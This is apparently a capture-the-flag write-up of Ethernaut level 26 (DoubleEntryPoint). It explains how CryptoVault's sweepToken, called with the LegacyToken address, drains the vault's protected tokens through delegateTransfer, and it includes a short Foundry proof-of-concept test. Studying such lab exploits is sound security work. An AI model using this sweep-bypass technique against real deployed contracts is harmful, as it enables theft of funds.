# Level 26 - DoubleEntryPoint

## Objectives

- figure out where the bug is in `CryptoVault` and protect it from being drained out of tokens

## Contract Overview

Code consists of four contracts.

The `Forta` contract serves as a decentralized detection and alert system within the dApp. Key features include:

- Detection Bot Management: Users can register detection bots by setting their address using the `setDetectionBot` function.
- Notification Handling: The contract allows registered detection bots to handle transaction notifications through the notify function. Bots can raise alerts using the `raiseAlert` function.
- Storage Management: The contract maintains mappings of users to detection bots and detection bots to raised alerts.

The `CryptoVault` contract acts as a secure storage facility for swept tokens within the dApp. Key features include:

- Initialization: The contract is initialized with a recipient address for swept tokens upon deployment.
- Underlying Token Management: The `setUnderlying` function allows the owner to set the underlying token contract address.
- Token Sweeping: The `sweepToken` function enables the transfer of tokens (excluding the underlying token) to the specified recipient address.

The `LegacyToken` contract represents a legacy ERC20 token within the dApp. Key features include:

- Token Minting: The `mint` function allows the owner to mint new tokens and assign them to a specified address.
- Delegate Contract Management: The `delegateToNewContract` function enables the owner to delegate token transfer functionality to a new contract address.
- Token Transfer: The `transfer` function overrides the standard ERC20 transfer function to delegate transfers to the specified delegate contract.

The `DoubleEntryPoint` contract functions as a gateway for token transfers within the dApp. Key features include:

- Initialization: Upon deployment, the contract is initialized with addresses for the legacy token, the CryptoVault, the Forta contract, and a player address. Additionally, 100 tokens are minted and allocated to the CryptoVault.
- Token Transfer: The contract overrides the standard ERC20 transfer function to delegate transfers to the specified delegate contract. It also ensures that only transactions originating from the legacy token contract trigger notifications to the Forta contract.
- Notification Handling: The contract implements a modifier to handle Forta notifications, facilitating the detection and alerting process for suspicious transactions.

## Finding the weak spots

Upon examining the `LegacyToken.sol` contract, we notice that `transfer` function looks interesting:

```solidity
    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }

```

There's a conditional check to determine whether a delegate contract has been defined. If no delegate contract is set `(address(delegate) == address(0))`, the function utilizes the default logic provided by the ERC20 standard. However, if a delegate contract is defined, it invokes the `delegateTransfer` function of the delegate contract (`delegate.delegateTransfer(to, value, msg.sender)`).

In this context, the delegate contract refers to the `DoubleEntryPoint` contract itself. What does this imply? Essentially, when a transfer operation is initiated on the `LegacyToken`, it effectively delegates the transfer process to execute the `DoubleEntryPoint.delegateTransfer` function. To fully understand this mechanism, let's examine the `delegateTransfer` function from `DoubleEntryPoint` contract.

```solidity
    function delegateTransfer(address to, uint256 value, address origSender)
        public
        override
        onlyDelegateFrom
        fortaNotify
        returns (bool)
    {
        _transfer(origSender, to, value);
        return true;
    }

```

This function is overriding `delegateTransfer` function from `DelegateERC20` interface.

```solidity

interface DelegateERC20 {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

```

What is more, the function has two important modifiers:

- `onlyDelegateFrom`: This modifier restricts the function to be called only by the delegate contract specified during deployment, which is the `LegacyToken` contract. Without this modifier, anyone could call the function directly, bypassing the intended delegation mechanism.
- `fortaNotify`: This modifier incorporates specific logic related to the Forta functionality.

The function itself is straightforward. It invokes the internal implementation of the ERC20 `_transfer` function. It's worth noting that `_transfer` only verifies that the `to` and `origSender` addresses are not `address(0)`, and that the `origSender` has sufficient tokens to transfer to `to`. However, it doesn't verify that `origSender` is the actual `msg.sender`, or that the spender has enough allowance. This is precisely why the `onlyDelegateFrom` modifier is crucial in ensuring the intended behavior of the delegation mechanism.

That is why the issue lies in the interaction between the `LegacyToken` and `DoubleEntryPoint` contracts. `LegacyToken`'s transfer function mirrors `DoubleEntryPoint`'s `delegateTransfer` function, allowing the transfer of `DoubleEntryPoint` tokens instead of `LegacyToken` tokens.

Since `CryptoVault`'s `underlying` token is `DoubleEntryPoint`, it prohibits sweeping `DoubleEntryPoint` tokens to prevent loss of funds. However, `LegacyToken`'s behavior enables omitting this restriction. By calling `CryptoVault`'s sweep function with the address of the `LegacyToken` contract, all `DoubleEntryPoint` tokens held in the `CryptoVault` can be swept.

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/26-DoubleEntryPoin.t.sol))

```solidity


        CryptoVault vault = CryptoVault(
            ethernautDoubleEntryPoint.cryptoVault()
        );

        address DET = ethernautDoubleEntryPoint.cryptoVault();
        address LGT = ethernautDoubleEntryPoint.delegatedFrom();

        emit log_named_uint(
            "Balance of DET token before attack",
            ethernautDoubleEntryPoint.balanceOf(DET)
        );

        // attack
        vault.sweepToken(IERC20(LGT));

        emit log_named_uint(
            "Balance of DET token after attack",
            ethernautDoubleEntryPoint.balanceOf(DET)
        );

        // Test assertion
        assertEq(ethernautDoubleEntryPoint.balanceOf(DET), 0);

```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/DoublyEntryPoint.png)

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-24-solution-double-entry-point)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
